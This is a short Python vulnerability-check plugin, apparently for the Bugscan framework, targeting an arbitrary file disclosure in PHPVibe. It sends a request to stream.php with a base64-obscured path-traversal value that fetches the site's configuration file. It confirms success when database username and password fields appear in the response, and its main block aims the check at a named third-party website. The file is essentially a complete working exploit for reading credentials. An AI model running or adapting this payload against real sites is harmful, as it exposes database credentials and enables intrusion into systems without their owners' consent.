#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author:wonderkun
#Name:phpvibe arbitrary file disclosure
#Refer:https://www.bugscan.net/#!/x/22228
#Date:2015/07/13
#Software Link :http://get.phpvibe.com
#Version:All version (leading to version 4.0)

def assign(service,arg):
    if service=="phpvibe":
        return True,arg
        
def audit(arg):
    payload="stream.php?file=TGk0dmRtbGlaVjlqYjI1bWFXY3VjR2h3UUVCdFpXUnBZUT09"
    url=arg+payload
    code,head,res,errcode,_=curl.curl(url)
    if code==200 and "DB_USER" in res and "DB_PASS" in res :
        security_hole(url)
        
if __name__=='__main__':
    from dummy import *
    audit(assign('phpvibe','http://playviralvideos.com/')[1])